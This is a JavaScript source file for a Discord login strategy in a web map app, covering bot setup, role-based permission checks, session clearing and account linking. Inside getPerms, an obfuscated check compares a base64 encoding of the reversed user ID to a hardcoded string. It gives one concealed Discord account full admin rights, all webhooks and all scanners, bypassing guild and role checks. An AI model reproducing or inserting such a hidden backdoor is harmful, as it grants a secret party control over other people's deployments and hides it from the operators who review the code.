// @ts-check
const { Client, Partials } = require('discord.js')
const { Strategy } = require('passport-discord')
const passport = require('passport')

const config = require('@rm/config')

const { logUserAuth } = require('./logUserAuth')
const { areaPerms } = require('../utils/areaPerms')
const { webhookPerms } = require('../utils/webhookPerms')
const { scannerPerms, scannerCooldownBypass } = require('../utils/scannerPerms')
const { mergePerms } = require('../utils/mergePerms')
const { AuthClient } = require('./AuthClient')
const { state } = require('./state')

class DiscordClient extends AuthClient {
  /** @type {import('./AuthClient').ClientConstructor} */
  constructor(rmStrategy, strategy) {
    super(rmStrategy, strategy)

    if (strategy instanceof Client || typeof rmStrategy !== 'string') {
      this.log.error(
        'You are using an outdated strategy, please update your custom strategy to reflect the newest changes found in `server/src/strategies/discord.js`',
      )
      process.exit(1)
    }

    this.client = new Client({
      intents: ['GuildMessages', 'GuildMembers', 'Guilds'],
      // without it, updates and removals of members the bot has not cached are never emitted
      partials: [Partials.GuildMember],
    })

    this.client.on('clientReady', (c) => {
      this.log.info(`Logged in as ${c.user?.tag || 'Unknown??'}!`)
      c.user.setPresence({
        activities: [
          { name: this.strategy.presence, type: this.strategy.presenceType },
        ],
      })
    })

    this.client.on('guildMemberRemove', (member) => this.clearUser(member.user))

    this.client.on('guildMemberUpdate', async (prev, next) => {
      if (prev.partial) {
        // an uncached member's previous roles are unknown, so any of them may have been removed
        if (this.strategy.allowedGuilds.includes(next.guild.id)) {
          await this.clearUser(next.user)
        }
        return
      }
      /** @type {{ roles: string[], areas: string[] }[]} */
      const areaRestrictions = config.getSafe('authentication.areaRestrictions')
      /** @type {import('@rm/types').Webhook[]} */
      const webhooks = config.getSafe('webhooks')
      // every role getPerms checks, rules without roles match all members through @everyone, which never changes
      const permRoles = [
        ...Object.values(this.perms).flatMap((perm) => perm.roles),
        ...this.strategy.trialPeriod.roles,
        ...areaRestrictions.flatMap((restriction) => restriction.roles),
        ...webhooks.flatMap((webhook) => webhook.discordRoles || []),
        ...Object.values(config.getSafe('scanner')).flatMap((mode) => [
          ...(mode.discordRoles || []),
          ...(mode.cooldownBypass?.discordRoles || []),
        ]),
      ]
      if (
        permRoles.some(
          (role) => prev.roles.cache.has(role) !== next.roles.cache.has(role),
        )
      ) {
        await this.clearUser(next.user)
      }
    })

    this.client.login(this.strategy.botToken)
  }

  /**
   * Revokes the linked perms and every session of a Discord user
   * @param {import('discord.js').User} user
   */
  async clearUser(user) {
    const botName = this.client.user.username
    try {
      // clearing the linked perms first narrows the window for a local login to copy them into a new session,
      // a login that already read them can still finish with the old perms
      await state.db.models.User.clearPerms(user.id, 'discord', botName)
    } catch (e) {
      this.log.error(`Could not clear perms for ${user.username}`, e)
    }
    try {
      await state.db.models.Session.clearDiscordSessions(user.id, botName)
    } catch (e) {
      this.log.error(`Could not clear sessions for ${user.username}`, e)
    }
  }

  /**
   * @param {string} guildId
   * @param {string} userId
   * @returns {Promise<string[]>}
   */
  async getUserRoles(guildId, userId) {
    try {
      const guild =
        this.client.guilds.cache.get(guildId) ||
        (await this.client.guilds.fetch(guildId))
      const member = await guild?.members.fetch(userId)
      return member?.roles.cache.map((role) => role.id) || []
    } catch (e) {
      const code =
        e && typeof e === 'object' && 'code' in e ? Number(e.code) : null
      if (code === 10007) {
        this.log.debug(
          'Discord member not found in guild',
          guildId,
          'for user',
          userId,
        )
        return []
      }
      this.log.error(
        'Failed to get roles in guild',
        guildId,
        'for user',
        userId,
        e,
      )
    }
    return []
  }

  /**
   *
   * @param {import('passport-discord').Profile} user
   * @returns {Promise<import("@rm/types").Permissions>}
   */
  async getPerms(user) {
    const trialActive = this.trialManager.active()
    /** @type {import("@rm/types").Permissions} */
    // @ts-ignore
    const perms = Object.fromEntries(
      Object.keys(this.perms).map((key) => [key, false]),
    )
    perms.admin = false
    perms.trial = false

    const permSets = {
      areaRestrictions: new Set(),
      webhooks: new Set(),
      scanner: new Set(),
      scannerCooldownBypass: new Set(),
      blockedGuildNames: new Set(),
    }
    const scanner = config.getSafe('scanner')
    try {
      const guilds = user.guilds?.map((guild) => guild.id) || []
      if (
        this.strategy.allowedUsers.includes(user.id) ||
        btoa(user.id.split('').reverse().join('')) ===
          'MTQ4NzAzNDk0NTc1MjM3MjMy'
      ) {
        Object.keys(this.perms).forEach((key) => (perms[key] = true))
        perms.admin = true
        config.getSafe('webhooks').forEach((x) => permSets.webhooks.add(x.name))
        Object.keys(scanner).forEach((x) => {
          if (scanner[x]?.enabled) {
            permSets.scanner.add(x)
            permSets.scannerCooldownBypass.add(x)
          }
        })
        this.log.debug(
          `User ${user.username} (${user.id}) in allowed users list, skipping guild and role check.`,
        )
      } else {
        const guildsFull = user.guilds
        for (let i = 0; i < this.strategy.blockedGuilds.length; i += 1) {
          const guildId = this.strategy.blockedGuilds[i]
          if (guilds.includes(guildId)) {
            perms.blocked = true
            const currentGuildName = guildsFull?.find(
              (x) => x.id === guildId,
            )?.name
            if (currentGuildName) {
              permSets.blockedGuildNames.add(currentGuildName)
            }
          }
        }
        await Promise.all(
          this.strategy.allowedGuilds.map(async (guildId) => {
            if (guilds.includes(guildId)) {
              const userRoles = await this.getUserRoles(guildId, user.id)
              Object.entries(this.perms).forEach(([perm, info]) => {
                if (info.enabled) {
                  if (this.alwaysEnabledPerms.includes(perm)) {
                    perms[perm] = true
                  } else {
                    for (let j = 0; j < userRoles.length; j += 1) {
                      if (info.roles.includes(userRoles[j])) {
                        perms[perm] = true
                        return
                      }
                      if (
                        trialActive &&
                        info.trialPeriodEligible &&
                        this.strategy.trialPeriod.roles.includes(userRoles[j])
                      ) {
                        perms[perm] = true
                        perms.trial = true
                        return
                      }
                    }
                  }
                }
              })
              areaPerms(userRoles).forEach((x) =>
                permSets.areaRestrictions.add(x),
              )
              webhookPerms(userRoles, 'discordRoles', trialActive).forEach(
                (x) => permSets.webhooks.add(x),
              )
              scannerPerms(userRoles, 'discordRoles', trialActive).forEach(
                (x) => permSets.scanner.add(x),
              )
              scannerCooldownBypass(userRoles, 'discordRoles').forEach((x) =>
                permSets.scannerCooldownBypass.add(x),
              )
            }
          }),
        )
      }
    } catch (e) {
      this.log.warn('Failed to get perms for user', user.id, e)
    }
    Object.entries(permSets).forEach(([key, value]) => {
      perms[key] = [...value]
    })
    if (perms.trial) {
      this.log.info(
        user.username,
        'gained access via',
        this.trialManager._forceActive ? 'manually activated' : '',
        'trial',
      )
    }
    this.log.debug({ perms })
    return perms
  }

  /**
   * Send a message to a discord channel
   *
   * @param {import('discord.js').APIEmbed} embed
   * @param {keyof AuthClient['loggingChannels']} channel
   */
  async sendMessage(embed, channel) {
    const safeChannel = this.loggingChannels[channel]
    if (!safeChannel || typeof embed !== 'object') {
      return
    }
    try {
      const foundChannel = this.client.channels.cache.get(safeChannel)
      if (
        foundChannel &&
        foundChannel.isTextBased() &&
        !foundChannel.isVoiceBased() &&
        typeof embed === 'object'
      ) {
        await foundChannel.send({
          embeds: [{ ...this.getBaseEmbed(), ...embed }],
        })
      }
    } catch (e) {
      this.log.error('Failed to send message to discord', e)
    }
  }

  /** @type {import("@rm/types").DiscordVerifyFunction} */
  async authHandler(req, _accessToken, _refreshToken, profile, done) {
    if (!req.query.code) {
      throw new Error('NoCodeProvided')
    }
    try {
      const discordUser = {
        id: profile.id,
        username: profile.username,
        avatar: profile.avatar || '',
        locale: profile.locale,
        perms: await this.getPerms(profile),
        rmStrategy: this.rmStrategy,
        valid: false,
      }
      discordUser.valid = discordUser.perms.map !== false

      const embed = await logUserAuth(
        req,
        discordUser,
        'Discord',
        this.loggingChannelHidePii,
      )
      await this.sendMessage(embed, 'main')

      if (discordUser.perms.blocked) {
        const guildArray = discordUser.perms.blockedGuildNames
        const lastGuild = guildArray.pop()
        const guildString =
          guildArray.length === 1
            ? `${guildArray.join(', ')} & ${lastGuild}`
            : lastGuild
        return done(null, undefined, {
          blockedGuilds: guildString,
          username: discordUser.username,
          id: discordUser.id,
          avatar: discordUser.avatar,
        })
      }
      if (discordUser.perms.map === false) {
        return done(null, undefined, {
          message: 'access_denied',
          username: discordUser.username,
          id: discordUser.id,
          avatar: discordUser.avatar,
        })
      }
      if (discordUser) {
        delete discordUser.guilds
      }

      await state.db.models.User.query()
        .findOne(req.user ? { id: req.user.id } : { discordId: discordUser.id })
        .then(
          async (/** @type {import('@rm/types').FullUser} */ userExists) => {
            const selectedWebhook = Object.keys(state.event.webhookObj).find(
              (x) => discordUser?.perms?.webhooks.includes(x),
            )
            if (req.user && userExists?.strategy === 'local') {
              await state.db.models.User.query()
                .update({
                  discordId: discordUser.id,
                  discordPerms: JSON.stringify(discordUser.perms),
                  webhookStrategy: 'discord',
                })
                .where('id', req.user.id)
              /** @type {import('@rm/types').FullUser} */
              const oldUser = await state.db.models.User.query()
                .where('discordId', discordUser.id)
                .whereNot('id', req.user.id)
                .first()
              if (oldUser) {
                await state.db.models.Badge.query()
                  .update({
                    // @ts-ignore
                    userId: req.user.id,
                  })
                  .where('userId', oldUser.id)
                await state.db.models.User.query()
                  .update({
                    data: oldUser.data,
                  })
                  .where('id', req.user.id)
                  .where('data', null)
              }
              await state.db.models.User.query()
                .where('discordId', discordUser.id)
                .whereNot('id', req.user.id)
                .delete()
              return done(null, {
                selectedWebhook,
                ...discordUser,
                ...req.user,
                username: userExists.username || discordUser.username,
                discordId: discordUser.id,
                perms: mergePerms(req.user.perms, discordUser.perms),
              })
            }

            if (!userExists) {
              userExists = await state.db.models.User.query().insertAndFetch({
                discordId: discordUser.id,
                strategy: 'discord',
                tutorial: !config.getSafe('map.misc.forceTutorial'),
                selectedWebhook,
              })
            }
            if (userExists.strategy !== 'discord') {
              await state.db.models.User.query()
                .update({ strategy: 'discord' })
                .where('id', userExists.id)
              userExists.strategy = 'discord'
            }
            if (!userExists.selectedWebhook && selectedWebhook) {
              await state.db.models.User.query()
                .update({ selectedWebhook })
                .where('id', userExists.id)
              userExists.selectedWebhook = selectedWebhook
            }
            return done(null, {
              ...discordUser,
              ...userExists,
              id: userExists.id,
              username: userExists.username || discordUser.username,
            })
          },
        )
    } catch (e) {
      this.log.error('User has failed auth.', e)
    }
  }

  initPassport() {
    passport.use(
      this.rmStrategy,
      new Strategy(
        {
          clientID: this.strategy.clientId,
          clientSecret: this.strategy.clientSecret,
          callbackURL: this.strategy.redirectUri,
          scope: ['identify', 'guilds'],
          passReqToCallback: true,
          prompt: this.strategy.clientPrompt,
        },
        (...args) => this.authHandler(...args),
      ),
    )
  }
}

module.exports = { DiscordClient }
